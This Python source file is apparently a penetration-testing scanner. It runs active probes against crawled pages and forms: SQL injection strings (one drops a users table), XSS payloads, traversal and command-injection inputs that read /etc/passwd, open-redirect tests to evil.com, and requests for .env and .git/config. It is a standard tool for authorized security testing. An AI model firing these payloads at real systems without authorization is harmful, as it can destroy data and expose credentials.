# enhanced_scanner.py
"""
Enhanced Penetration Testing Scanner
Comprehensive vulnerability detection with multiple attack vectors
"""

import requests
import json
import os
import logging
import time
import re
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, urlsplit
from bs4 import BeautifulSoup
from passive_header_analyzer import PassiveHeaderAnalyzer
from common_paths_scanner import CommonPathsScanner

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

class EnhancedScanner:
    def __init__(self, base_url, session=None):
        self.base_url = base_url.rstrip('/')
        self.session = session or requests.Session()
        self.session.headers.update({
            "User-Agent": "EnhancedScanner/2.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        })
        self.findings = {
            "sql_injection": [],
            "xss": [],
            "csrf": [],
            "directory_traversal": [],
            "file_inclusion": [],
            "command_injection": [],
            "xxe": [],
            "ssrf": [],
            "open_redirect": [],
            "information_disclosure": [],
            "header_analysis": [],
            "common_paths": []
        }
        
        # Initialize new analyzers
        self.header_analyzer = PassiveHeaderAnalyzer(session)
        self.paths_scanner = CommonPathsScanner(session)

    def load_crawl_data(self, crawl_file="data/crawl_results.json"):
        """Load crawl results from JSON file"""
        try:
            with open(crawl_file, "r", encoding="utf-8") as f:
                return json.load(f)
        except FileNotFoundError:
            logging.error(f"Crawl file {crawl_file} not found")
            return None

    def save_findings(self, filename="data/enhanced_findings.json"):
        """Save all findings to JSON file"""
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(self.findings, f, indent=2)
        logging.info(f"Enhanced findings saved to {filename}")

    # ==================== SQL INJECTION DETECTION ====================
    
    def test_sql_injection(self, url, params, method="GET"):
        """Enhanced SQL injection testing"""
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'x'='x",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "1' AND '1'='1"
        ]
        
        sql_error_patterns = [
            r"mysql_fetch_array\(\)",
            r"Warning: mysql_",
            r"valid MySQL result",
            r"PostgreSQL query failed",
            r"Warning: pg_",
            r"valid PostgreSQL result",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark",
            r"SQLServer JDBC Driver",
            r"Oracle error",
            r"ORA-01756",
            r"quoted string not properly terminated",
            r"sql syntax.*mysql",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version"
        ]
        
        findings = []
        
        for param, value in params.items():
            for payload in sql_payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = value + payload
                    
                    if method.upper() == "GET":
                        resp = self.session.get(url, params=test_params, timeout=5)
                    else:
                        resp = self.session.post(url, data=test_params, timeout=5)
                    
                    # Check for SQL error patterns
                    for pattern in sql_error_patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            findings.append({
                                "type": "SQL Injection",
                                "url": url,
                                "parameter": param,
                                "payload": payload,
                                "method": method,
                                "evidence": resp.text[:200],
                                "status_code": resp.status_code
                            })
                            break
                    
                    time.sleep(0.1)  # Rate limiting
                    
                except Exception as e:
                    logging.debug(f"SQL test failed for {param}: {e}")
        
        return findings

    # ==================== XSS DETECTION ====================
    
    def test_xss(self, url, params, method="GET"):
        """Enhanced XSS testing"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert`XSS`</script>",
            "<script>alert(1)</script>"
        ]
        
        findings = []
        
        for param, value in params.items():
            for payload in xss_payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    if method.upper() == "GET":
                        resp = self.session.get(url, params=test_params, timeout=5)
                    else:
                        resp = self.session.post(url, data=test_params, timeout=5)
                    
                    # Check if payload is reflected
                    if payload in resp.text or any(part in resp.text for part in payload.split('>')):
                        findings.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "method": method,
                            "evidence": resp.text[:500],
                            "status_code": resp.status_code
                        })
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    logging.debug(f"XSS test failed for {param}: {e}")
        
        return findings

    # ==================== CSRF DETECTION ====================
    
    def test_csrf(self, forms):
        """Test for CSRF vulnerabilities"""
        findings = []
        
        for form in forms:
            # Check if CSRF protection exists
            csrf_tokens = []
            for input_field in form.get('inputs', []):
                if input_field.get('name', '').lower() in ['csrf_token', 'csrf', '_token', 'authenticity_token']:
                    csrf_tokens.append(input_field.get('name'))
            
            if not csrf_tokens and form.get('method', '').upper() == 'POST':
                findings.append({
                    "type": "CSRF Vulnerability",
                    "form_action": form.get('action'),
                    "method": form.get('method'),
                    "issue": "No CSRF protection detected",
                    "severity": "Medium"
                })
        
        return findings

    # ==================== DIRECTORY TRAVERSAL ====================
    
    def test_directory_traversal(self, url, params):
        """Test for directory traversal vulnerabilities"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        findings = []
        
        for param, value in params.items():
            for payload in traversal_payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    resp = self.session.get(url, params=test_params, timeout=5)
                    
                    # Check for common file content indicators
                    if any(indicator in resp.text.lower() for indicator in [
                        'root:', 'bin:', 'daemon:', 'nobody:', 'localhost',
                        '127.0.0.1', 'windows', 'microsoft', 'system32'
                    ]):
                        findings.append({
                            "type": "Directory Traversal",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": resp.text[:300],
                            "status_code": resp.status_code
                        })
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    logging.debug(f"Directory traversal test failed for {param}: {e}")
        
        return findings

    # ==================== COMMAND INJECTION ====================
    
    def test_command_injection(self, url, params, method="GET"):
        """Test for command injection vulnerabilities"""
        cmd_payloads = [
            "; ls",
            "| whoami",
            "& id",
            "; cat /etc/passwd",
            "| dir",
            "& type C:\\windows\\system32\\drivers\\etc\\hosts",
            "; uname -a",
            "| hostname",
            "& echo vulnerable",
            "; ping -c 1 127.0.0.1"
        ]
        
        findings = []
        
        for param, value in params.items():
            for payload in cmd_payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = value + payload
                    
                    if method.upper() == "GET":
                        resp = self.session.get(url, params=test_params, timeout=5)
                    else:
                        resp = self.session.post(url, data=test_params, timeout=5)
                    
                    # Check for command output indicators
                    if any(indicator in resp.text for indicator in [
                        'uid=', 'gid=', 'groups=', 'root', 'bin', 'daemon',
                        'Volume in drive', 'Directory of', 'vulnerable'
                    ]):
                        findings.append({
                            "type": "Command Injection",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": resp.text[:300],
                            "status_code": resp.status_code
                        })
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    logging.debug(f"Command injection test failed for {param}: {e}")
        
        return findings

    # ==================== OPEN REDIRECT ====================
    
    def test_open_redirect(self, url, params):
        """Test for open redirect vulnerabilities"""
        redirect_payloads = [
            "http://evil.com",
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "ftp://evil.com",
            "file:///etc/passwd"
        ]
        
        findings = []
        
        for param, value in params.items():
            for payload in redirect_payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    
                    resp = self.session.get(url, params=test_params, timeout=5, allow_redirects=False)
                    
                    # Check for redirect headers
                    if resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get('Location', '')
                        if any(domain in location for domain in ['evil.com', 'localhost', '127.0.0.1']):
                            findings.append({
                                "type": "Open Redirect",
                                "url": url,
                                "parameter": param,
                                "payload": payload,
                                "redirect_location": location,
                                "status_code": resp.status_code
                            })
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    logging.debug(f"Open redirect test failed for {param}: {e}")
        
        return findings

    # ==================== INFORMATION DISCLOSURE ====================
    
    def test_information_disclosure(self, url):
        """Test for information disclosure"""
        findings = []
        
        # Test common sensitive files
        sensitive_paths = [
            "/.env",
            "/config.php",
            "/wp-config.php",
            "/.git/config",
            "/.svn/entries",
            "/backup.sql",
            "/database.sql",
            "/phpinfo.php",
            "/info.php",
            "/test.php",
            "/admin.php",
            "/.htaccess",
            "/robots.txt",
            "/sitemap.xml",
            "/crossdomain.xml"
        ]
        
        for path in sensitive_paths:
            try:
                test_url = urljoin(url, path)
                resp = self.session.get(test_url, timeout=5)
                
                if resp.status_code == 200:
                    # Check for sensitive content
                    sensitive_content = [
                        'password', 'secret', 'key', 'token', 'api',
                        'database', 'mysql', 'postgresql', 'oracle',
                        'admin', 'root', 'user', 'config'
                    ]
                    
                    content_lower = resp.text.lower()
                    if any(keyword in content_lower for keyword in sensitive_content):
                        findings.append({
                            "type": "Information Disclosure",
                            "url": test_url,
                            "file": path,
                            "evidence": resp.text[:500],
                            "status_code": resp.status_code
                        })
                
                time.sleep(0.1)
                
            except Exception as e:
                logging.debug(f"Information disclosure test failed for {path}: {e}")
        
        return findings

    # ==================== PASSIVE HEADER ANALYSIS ====================
    
    def analyze_headers(self, url):
        """Analyze HTTP headers for security issues"""
        logging.info(f"Analyzing headers for: {url}")
        
        try:
            header_findings = self.header_analyzer.analyze_headers(url)
            
            # Consolidate header findings
            for category, findings in header_findings.items():
                if findings:
                    self.findings["header_analysis"].extend(findings)
            
            return header_findings
            
        except Exception as e:
            logging.error(f"Header analysis failed for {url}: {e}")
            return {}

    # ==================== COMMON PATHS SCANNING ====================
    
    def scan_common_paths(self, base_url):
        """Scan for common paths and files"""
        logging.info(f"Scanning common paths for: {base_url}")
        
        try:
            paths_findings = self.paths_scanner.scan_common_paths(base_url)
            
            # Consolidate paths findings
            for category, findings in paths_findings.items():
                if findings:
                    self.findings["common_paths"].extend(findings)
            
            # Additional directory traversal scan
            traversal_findings = self.paths_scanner.scan_directory_traversal(base_url)
            if traversal_findings:
                self.findings["directory_traversal"].extend(traversal_findings)
            
            # Additional common files scan
            common_files_findings = self.paths_scanner.scan_common_files(base_url)
            if common_files_findings:
                self.findings["information_disclosure"].extend(common_files_findings)
            
            return paths_findings
            
        except Exception as e:
            logging.error(f"Common paths scan failed for {base_url}: {e}")
            return {}

    # ==================== MAIN SCANNING METHOD ====================
    
    def scan(self, crawl_data):
        """Perform comprehensive vulnerability scan"""
        logging.info("Starting enhanced vulnerability scan...")
        
        pages = crawl_data.get('pages', [])
        forms = crawl_data.get('forms', [])
        
        # Perform passive header analysis on base URL
        logging.info("Performing passive header analysis...")
        self.analyze_headers(self.base_url)
        
        # Perform common paths scanning
        logging.info("Scanning common paths and files...")
        self.scan_common_paths(self.base_url)
        
        # Test each page for vulnerabilities
        for page in pages:
            url = page.get('url')
            if not url:
                continue
            
            logging.info(f"Scanning page: {url}")
            
            # Extract parameters from URL
            parsed = urlsplit(url)
            params = dict(parse_qs(parsed.query))
            
            # Flatten parameter values
            flat_params = {}
            for key, values in params.items():
                flat_params[key] = values[0] if values else ''
            
            if flat_params:
                # SQL Injection tests
                sql_findings = self.test_sql_injection(url, flat_params)
                self.findings['sql_injection'].extend(sql_findings)
                
                # XSS tests
                xss_findings = self.test_xss(url, flat_params)
                self.findings['xss'].extend(xss_findings)
                
                # Directory Traversal tests
                traversal_findings = self.test_directory_traversal(url, flat_params)
                self.findings['directory_traversal'].extend(traversal_findings)
                
                # Command Injection tests
                cmd_findings = self.test_command_injection(url, flat_params)
                self.findings['command_injection'].extend(cmd_findings)
                
                # Open Redirect tests
                redirect_findings = self.test_open_redirect(url, flat_params)
                self.findings['open_redirect'].extend(redirect_findings)
            
            # Information Disclosure tests
            info_findings = self.test_information_disclosure(url)
            self.findings['information_disclosure'].extend(info_findings)
        
        # Test forms for vulnerabilities
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'GET').upper()
            inputs = form.get('inputs', [])
            
            if not action or not inputs:
                continue
            
            # Build form parameters
            form_params = {}
            for inp in inputs:
                name = inp.get('name')
                if name:
                    form_params[name] = inp.get('value', 'test')
            
            if form_params:
                # SQL Injection tests on forms
                sql_findings = self.test_sql_injection(action, form_params, method)
                self.findings['sql_injection'].extend(sql_findings)
                
                # XSS tests on forms
                xss_findings = self.test_xss(action, form_params, method)
                self.findings['xss'].extend(xss_findings)
        
        # CSRF tests
        csrf_findings = self.test_csrf(forms)
        self.findings['csrf'].extend(csrf_findings)
        
        # Save findings
        self.save_findings()
        
        # Print summary
        total_findings = sum(len(findings) for findings in self.findings.values())
        logging.info(f"Scan completed. Total findings: {total_findings}")
        
        for vuln_type, findings in self.findings.items():
            if findings:
                logging.info(f"{vuln_type.replace('_', ' ').title()}: {len(findings)} findings")
        
        return self.findings

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Enhanced vulnerability scanner")
    parser.add_argument("--crawl", default="data/crawl_results.json", help="Crawl results file")
    parser.add_argument("--output", default="data/enhanced_findings.json", help="Output file")
    args = parser.parse_args()
    
    scanner = EnhancedScanner("http://example.com")
    crawl_data = scanner.load_crawl_data(args.crawl)
    
    if crawl_data:
        findings = scanner.scan(crawl_data)
        print(f"Enhanced scan completed. Findings saved to {args.output}")
    else:
        print("Failed to load crawl data")
